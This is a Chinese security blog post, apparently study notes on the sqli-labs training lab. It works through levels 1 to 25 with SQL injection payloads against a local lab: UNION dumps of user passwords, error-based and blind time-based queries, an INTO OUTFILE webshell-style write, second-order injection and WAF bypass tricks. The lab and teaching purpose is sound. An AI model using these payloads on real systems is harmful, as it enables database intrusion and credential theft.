@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="KarmA" />
+
+
+
+<meta name="description" content="边学边记，Sqli-labs">
+<meta name="keywords" content="Summary,SQL Injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL Injection - Sqli-labs">
+<meta property="og:url" content="http://blog.0akarma.me/Study/sqli-labs.html">
+<meta property="og:site_name" content="KarmA @ D0g3">
+<meta property="og:description" content="边学边记，Sqli-labs">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-10-11T16:40:52.460Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL Injection - Sqli-labs">
+<meta name="twitter:description" content="边学边记，Sqli-labs">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="KarmA @ D0g3" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>SQL Injection - Sqli-labs | KarmA @ D0g3</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: false,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?af7140fc2364ae33aedfd77c0de502e1";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">KarmA</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Stay hungry.Stay foolish.</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">Home</a></li>
+                        
+                            <li><a href="/archives/">Archives</a></li>
+                        
+                            <li><a href="/tags/">Tags</a></li>
+                        
+                            <li><a href="/board/">Comment</a></li>
+                        
+                            <li><a href="/about/">About &amp; Links</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/akkayin" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:karma@d0g3.cn" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="http://weibo.com/akkayin" title="新浪微博"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/harold-95-37/activities" title="知乎"></a>
+                            
+                                <a class="fa Twitter" href="https://twitter.com/harold_kung" title="Twitter"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Achievements/">Achievements</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Book/">Book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CET/">CET</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS-Recurrence/">CMS Recurrence</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Expectation/">Expectation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Film/">Film</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flag/">Flag</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MISC/">MISC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mac/">Mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mark/">Mark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Meditation/">Meditation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Movie/">Movie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Notes/">Notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetration-Testing/">Penetration Testing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Perception/">Perception</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL-Injection/">SQL Injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Scrapy/">Scrapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shell/">Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Summary/">Summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vulnhub/">Vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Words-Phrases/">Words&Phrases</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mentohust/">mentohust</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心路历程/">心路历程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透课程/">渗透课程</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">KarmA</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">KarmA</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Stay hungry.Stay foolish.</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">Home</a></li>
+                
+                    <li><a href="/archives/">Archives</a></li>
+                
+                    <li><a href="/tags/">Tags</a></li>
+                
+                    <li><a href="/board/">Comment</a></li>
+                
+                    <li><a href="/about/">About &amp; Links</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/akkayin" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:karma@d0g3.cn" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/akkayin" title="新浪微博"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/harold-95-37/activities" title="知乎"></a>
+                            
+                                <a class="fa Twitter" target="_blank" href="https://twitter.com/harold_kung" title="Twitter"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-sqlinjection-sqlilabs" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/Study/sqli-labs.html" class="article-date">
+      <time datetime="2018-02-05T10:15:13.000Z" itemprop="datePublished">2018-02-05</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SQL Injection - Sqli-labs
+    </h1>
+  
+
+        
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Study/">Study</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-Injection/">SQL Injection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <excerpt in="" index="" |="" 首页摘要="">
+
+<p>边学边记，Sqli-labs<a id="more"></a></p>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+<h2 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h2><h3 id="less-1-GET-Error-based-Single-quotes-String"><a href="#less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="less-1 GET - Error based - Single quotes - String"></a>less-1 GET - Error based - Single quotes - String</h3><p>(基于错误的GET单引号字符型注入)</p>
+<h4 id="查询（union）"><a href="#查询（union）" class="headerlink" title="查询（union）"></a>查询（union）</h4><p>当函数mysql_fetch_array只被调用了一次时，且想显示非第一行查询的数据库数据时，可以让第一行的查询结果为空，那么，非第一行（union右边）的查询结果自然就成了第一行。</p>
+<p><strong>union的作用是将两个sql语句进行联合。union前后的两个sql语句的选择列数要相同才可以（用order by查询行数） 。Union all与union 的区别是增加了去重的功能</strong></p>
+<h4 id="数据库连接函数"><a href="#数据库连接函数" class="headerlink" title="数据库连接函数"></a>数据库连接函数</h4><p>concat和concat_ws</p>
+<p>其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p>
+<p>常用：concat_ws(char(32,58,32),user(),database(),version())</p>
+<h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><p>查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了</p>
+<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>查表时也只能返回一个table，所以要用limit来控制结果集具体是哪一行</p>
+<h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,2,3 –+</p>
+<p>爆库：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(schema_name),3 from information_schema.schemata–+</p>
+<p>爆表：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<p>爆列：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+</p>
+<p>爆数据：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,username,password from users where id =3–+</p>
+<h3 id="less-2-GET-Error-based-Intiger-based"><a href="#less-2-GET-Error-based-Intiger-based" class="headerlink" title="less-2 GET - Error based - Intiger based"></a>less-2 GET - Error based - Intiger based</h3><p> (基于错误的GET整型注入)</p>
+<p>跟less1一样，只是不用闭合‘</p>
+<h4 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1</p>
+<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1–+</p>
+<h3 id="less-3-GET-Error-based-Single-quotes-with-twist-string"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="less-3 GET - Error based - Single quotes with twist string"></a>less-3 GET - Error based - Single quotes with twist string</h3><p>(基于错误的GET单引号变形字符型注入)</p>
+<p>多了 <strong>‘)</strong> 那么sql语句里的id 应该就是 (‘$id’) 这样！</p>
+<h4 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1&#39;</a>) or ‘1’=(‘1’</p>
+<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
+<h3 id="less-4-GET-Error-based-Double-Quotes-String"><a href="#less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="less-4 GET - Error based - Double Quotes - String"></a>less-4 GET - Error based - Double Quotes - String</h3><p>(基于错误的GET双引号字符型注入) </p>
+<p>php中双引号可以包含单引号，所以判断是否存在注入时，还需要用 <strong>“</strong> 来判断</p>
+<h4 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-4/index.php/?id=1&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1&quot;</a>) –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-4/index.php/?id=1&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1&quot;</a>) or “1”=(“1</p>
+<h3 id="less-5-GET-Double-Injection-Single-Quotes-String"><a href="#less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="less-5 GET - Double Injection - Single Quotes - String"></a>less-5 GET - Double Injection - Single Quotes - String</h3><p>(双注入GET单引号字符型注入)</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>count(*)</strong></p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)\</em>2))a from information_schema.columns group by a–+</p>
+<p><strong>exp</strong></p>
+<p>数据类型超出范围进行报错注入</p>
+<p><strong>bigint</strong></p>
+<p>bigint溢出进行报错注入</p>
+<p><strong>xpath</strong></p>
+<p>xpath函数报错注入</p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+</p>
+<p><strong>利用数据的重复性</strong></p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+</p>
+<h4 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
+<p>布尔注入：</p>
+<p>报错注入：</p>
+<p><a href="http://localhost/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli/Less-5/?id=1&#39;</a> and (select 1 from(select count(*<em>),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()</em> *2))name from information_schema.tables group by name)b) –+</p>
+<p>延时注入：</p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+ </p>
+<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+</p>
+<h3 id="less-6-GET-Double-Injection-Double-Quotes-String"><a href="#less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="less-6 GET - Double Injection - Double Quotes - String"></a>less-6 GET - Double Injection - Double Quotes - String</h3><p>(双注入GET双引号字符型注入)</p>
+<p>payload跟less-5异曲同工，只是把 ‘ 改成 “ </p>
+<h3 id="less-7-GET-Dump-into-outfile-String"><a href="#less-7-GET-Dump-into-outfile-String" class="headerlink" title="less-7 GET - Dump into outfile - String"></a>less-7 GET - Dump into outfile - String</h3><p>(导出文件GET字符型注入)</p>
+<p>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</p>
+<p>outfile函数将数据库中的内容写到一个文件中</p>
+<p>dumpfile只能使用一行</p>
+<p>load_file函数用来从文件系统中将文件导入到mysql中</p>
+<p>虽然有相应数据库权限，也对路径进行了转义，但是还是没有成功导出文件，尝试导出在tmp文件夹，发现也不行。先放着吧！</p>
+<p><a href="http://localhost/sqli-labs/Less-7/index.php/?id=1&#39;)" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-7/index.php/?id=1&#39;)</a>) union select 1,2,3 into outfile “C:\phpStudy\tmp\1.php” %23 </p>
+<h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="less-8 GET - Blind - Boolian Based - Single Quotes"></a>less-8 GET - Blind - Boolian Based - Single Quotes</h3><p>(布尔型单引号GET盲注)</p>
+<p>这一关把mysql报错的语句注释了，所以就不能用报错注入了。</p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>left()</strong></p>
+<p>left()得到字符串左部指定个数的字符    </p>
+<p>left ( string, n )        string为要截取的字符串，n为长度。</p>
+<p>正确时返回 “You are in 。。。。“ 否则则无回显。</p>
+<p><strong>length()</strong></p>
+<p>测试数据库长度</p>
+<p><strong>substr()与ascii()并用 </strong></p>
+<p>substr()和substring()函数实现的功能是一样的，均为截取字符串。</p>
+<p>​    string substring(string, start, length)</p>
+<p>​    string substr(string, start, length)</p>
+<p>获取security数据库的第一个表(limit 0,1)的字符</p>
+<p>获取该数据库的第二个表 limit 1,1</p>
+<p><strong>regexp</strong></p>
+<p>利用regexp获取（2）中users表中的列</p>
+<p>I    select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0));</p>
+<p>II    select * from users where id=1 and 1=(user() regexp’^ri’);</p>
+<p>通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。</p>
+<p>III    select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
+<p>这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可</p>
+<p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p>
+<p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">SQL盲注之正则表达式攻击</a></p>
+<p><strong>ord() 和 mid(column_name,start[,length])</strong></p>
+<p>利用 ord()（此函数为返回第一个字符的ASCII码） 和 mid() 函数获取users表的内容</p>
+<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
+<h3 id="less-9-GET-Blind-Time-based-Single-Quotes"><a href="#less-9-GET-Blind-Time-based-Single-Quotes" class="headerlink" title="less-9 GET - Blind - Time based. -  Single Quotes"></a>less-9 GET - Blind - Time based. -  Single Quotes</h3><p> (基于时间的GET单引号盲注)</p>
+<h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><p><strong>sleep()</strong></p>
+<p>利用sleep()函数进行注入</p>
+<p><a href="http://localhost/sqli-labs/Less-9/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-9/index.php/</a><br>?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
+<p><strong>BENCHMARK()</strong></p>
+<p>利用BENCHMARK()进行延时注入</p>
+<p>当结果正确的时候，运行ENCODE(‘MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p>
+<h4 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
+<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+</p>
+<h3 id="less-10-GET-Blind-Time-based-double-quotes"><a href="#less-10-GET-Blind-Time-based-double-quotes" class="headerlink" title="less-10 GET - Blind - Time based - double quotes"></a>less-10 GET - Blind - Time based - double quotes</h3><p> (基于时间的双引号盲注)</p>
+<p>与less-9一样，只是从 ’ 变成 “ </p>
+<h3 id="less-11-POST-Error-Based-single-quotes-String"><a href="#less-11-POST-Error-Based-single-quotes-String" class="headerlink" title="less-11 POST - Error Based - single quotes - String"></a>less-11 POST - Error Based - single quotes - String</h3><p>在GET型里面用到的大部分方法都可以使用</p>
+<h3 id="less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="less-12 POST - Error Based - Double quotes - String - with twist"></a>less-12 POST - Error Based - Double quotes - String - with twist</h3><p><strong>’</strong> 变 <strong>”</strong></p>
+<h3 id="less-13-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-13-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-13 POST Double injection - Single quotes - String - with twist"></a>less-13 POST Double injection - Single quotes - String - with twist</h3><p>从错误回显中知道对id进行了 <strong>‘)</strong>处理，所以用布尔盲注来判断是否成功login</p>
+<h4 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h4><p>payload:</p>
+<p>猜版本号</p>
+<p>uname=admin’)and left(@@version,1)=5%23 &amp;passwd=2222&amp;submit=Submit</p>
+<h3 id="less-14-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-14-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-14 POST - Double injection - Single quotes - String - with twist"></a>less-14 POST - Double injection - Single quotes - String - with twist</h3><p>有报错，可以用报错注入</p>
+<h4 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
+<h3 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="less-15 POST - Blind - Boolian/time Based - Single quotes"></a>less-15 POST - Blind - Boolian/time Based - Single quotes</h3><p>没有错误回显，可以用布尔盲注和延时注入</p>
+<h4 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
+<h3 id="less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><a href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="less-16 POST - Blind - Boolian/Time Based - Double quotes"></a>less-16 POST - Blind - Boolian/Time Based - Double quotes</h3><p>单引号变双引号</p>
+<h3 id="less-17-POST-Update-Query-Error-Based-String"><a href="#less-17-POST-Update-Query-Error-Based-String" class="headerlink" title="less-17 POST - Update Query - Error Based - String"></a>less-17 POST - Update Query - Error Based - String</h3><p>这题只能从password处注入，因为username处的特殊字符都用 check_input()函数 经过了特殊转义</p>
+<p><a href="http://www.cnblogs.com/lcamry/p/5763048.html" target="_blank" rel="noopener">增删改函数介绍</a></p>
+<h3 id="less-18-POST-Header-injection-Uagent-field-Error-based"><a href="#less-18-POST-Header-injection-Uagent-field-Error-based" class="headerlink" title="less-18 POST - Header injection - Uagent field - Error based"></a>less-18 POST - Header injection - Uagent field - Error based</h3><p>这一题把password处也跟username一样处理了，所以那两处都无法注入了。看代码得知这里的注入是INSERT类型的，INSERT注入可以利用报错注入的方式获取数据。</p>
+<h3 id="less-19-POST-Header-injection-Referer-field-Error-based"><a href="#less-19-POST-Header-injection-Referer-field-Error-based" class="headerlink" title="less-19 POST - Header injection Referer field - Error based"></a>less-19 POST - Header injection Referer field - Error based</h3><p>跟上一题一样，只是在referer中注入</p>
+<h3 id="less-20-POST-Cookie-injection-Uagent-field-error-based"><a href="#less-20-POST-Cookie-injection-Uagent-field-error-based" class="headerlink" title="less-20 POST - Cookie injection - Uagent field - error based"></a>less-20 POST - Cookie injection - Uagent field - error based</h3><p>username获取 -&gt; cookie -&gt; username读取 -&gt; 查询</p>
+<h3 id="less-21-POST-Dump-into-outfile-String"><a href="#less-21-POST-Dump-into-outfile-String" class="headerlink" title="less-21 POST Dump into outfile - String"></a>less-21 POST Dump into outfile - String</h3><p>跟上一题一样，只是cookie要base64编码一下</p>
+<h3 id="less-22-Future-Editions"><a href="#less-22-Future-Editions" class="headerlink" title="less-22 Future Editions"></a>less-22 Future Editions</h3><p>把‘变成”</p>
+<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>基于page-2 都是一些绕waf的题，所以顺便将绕waf的新姿势mark下来。</p>
+<h4 id="过滤-or-和-and"><a href="#过滤-or-和-and" class="headerlink" title="过滤 or 和 and"></a>过滤 or 和 and</h4><p>大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/<em>or</em>/<br>利用符号 and=&amp;&amp; or=||</p>
+<h4 id="过滤-空格，or，and-–-等各种符号"><a href="#过滤-空格，or，and-–-等各种符号" class="headerlink" title="过滤 空格，or，and,/*,#,–,/等各种符号"></a>过滤 空格，or，and,/*,#,–,/等各种符号</h4><p>过滤 空格，or，and,/*,#,–,/等各种符号<br>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：</p>
+<p>%09 TAB键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return功能<br>%0b TAB键（垂直）<br>%a0 空格</p>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>过滤了# 和–<br>用’闭合后面的’即可</p>
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>二次排序注入</p>
+<p>注册一个admin’#帐号，然后登录，修改密码。发现修改的是admin的密码！</p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤 or 和 and</p>
